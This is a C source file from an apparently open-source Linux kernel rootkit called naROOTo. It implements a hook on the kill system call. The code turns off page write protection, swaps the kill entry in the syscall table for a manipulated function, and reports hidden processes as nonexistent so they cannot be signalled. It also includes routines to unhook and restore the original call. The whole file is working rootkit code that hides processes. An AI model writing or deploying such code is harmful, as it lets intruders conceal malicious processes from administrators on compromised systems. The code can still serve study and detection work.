/******************************************************************************
 *
 * Name: kill.c 
 * This file contains everything needed for the manipulated kill syscall.
 *
 *****************************************************************************/
/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include "control.h"
#include "include.h"

/* pointers to some important kernel functions/resources */
asmlinkage long (*original_kill) (pid_t pid, int sig);

/* used to keep track of whether we hooked kill or not */
static unsigned int kill_hooked = 0;

/*
 * call counter to ensure that we are not unhooking the
 * kill function while it is in use and the corresponding
 * spinlock
 */
static int kill_call_counter = 0;
static spinlock_t kill_lock;
static unsigned long kill_lock_flags;

/*
 * Our manipulated kill syscall. It checks whether a process to be signaled is hidden.
 * If it is, the signal is not send. Otherwise it works normally and calls the original kill.
 */
asmlinkage long
manipulated_kill (pid_t pid, int sig)
{
	/* lock and increase the call counter */
	INCREASE_CALL_COUNTER(kill_call_counter, &kill_lock, kill_lock_flags);

	// TODO: check BEFORE calling original_kill but also check if sig is valid before that
	long retv = (*original_kill) (pid, sig);
	if(retv == 0 && is_process_hidden(pid)) {
		retv = -ESRCH;
		ROOTKIT_DEBUG("Blocked signal %u for process %u - ret: %li\n", sig, pid, retv);
	}

	/* lock and decrease the call counter */
	DECREASE_CALL_COUNTER(kill_call_counter, &kill_lock, kill_lock_flags);
	return retv;
}

/*
 * hooks the system call 'kill'
 */
void
hook_kill (void) {
	ROOTKIT_DEBUG("Hooking the kill syscall...\n");
	
	void **sys_call_table = (void *) sysmap_sys_call_table;
	
	/* initialize our spinlock for the kill counter */
	spin_lock_init(&kill_lock);

	/* disable write protection */
	disable_page_protection();

	/* replace the syscall kill */
	original_kill = (void *) sys_call_table[__NR_kill];
	sys_call_table[__NR_kill] = (long *) manipulated_kill;

	/* reenable write protection */
	enable_page_protection();
	
	/* set to hooked */
	kill_hooked = 1;
	
	/* log and return */
	ROOTKIT_DEBUG("Done.\n");
	return;
}

/*
 * restores the original system call 'kill'
 */
void
unhook_kill (void) {
	ROOTKIT_DEBUG("Unhooking the kill syscall...\n");
	
	/* only do anything if kill is actually hooked */
	if(!kill_hooked) {
		ROOTKIT_DEBUG("Nothing to do.\n");
		return;
	}
	
	void **sys_call_table = (void *) sysmap_sys_call_table;

	/* disable write protection */
	disable_page_protection();

	/* restore the old syscall */
	sys_call_table[__NR_kill] = (long *) original_kill;

	/* reenable write protection */
	enable_page_protection();

	/* set to not-hooked */
	kill_hooked = 0;
	
	/* ensure that all processes have left our manipulated syscall */
	while(kill_call_counter > 0) {
		msleep(2);
	}
	
	/* log and return */
	ROOTKIT_DEBUG("Done.\n");
}
